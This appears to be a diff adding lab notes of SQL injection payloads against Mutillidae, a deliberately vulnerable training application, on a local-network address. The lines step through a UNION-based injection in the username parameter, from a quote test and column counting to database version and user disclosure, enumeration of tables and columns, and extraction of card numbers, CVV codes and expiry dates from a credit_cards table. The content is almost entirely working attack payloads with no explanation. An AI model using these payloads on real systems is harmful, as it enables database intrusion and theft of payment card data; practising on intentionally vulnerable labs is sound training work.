@@ -1,0 +1,20 @@
+http://192.168.0.145/mutillidae/index.php?page=user-info.php&username=abc&password=abc&user-info-php-submit-button=View+Account+Details
+
+username=abc'&password=abc
+
+username=abc'order by 5%23 
+
+username=abc'union select 1,2,3,4,5%23
+
+username=abc'union select 1,database(),user(),version(),5%23
+
+username=abc'union select 1,table_name,null,null,5 from information_schema.tables%23
+
+
+username=abc'union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'%23
+
+
+username=abc'union select 1,column_name,null,null,5 from information_schema.columns where table_name='credit_cards'%23
+
+
+username=abc'union select 1,ccnumber,ccv,expiration,5 from credit_cards%23
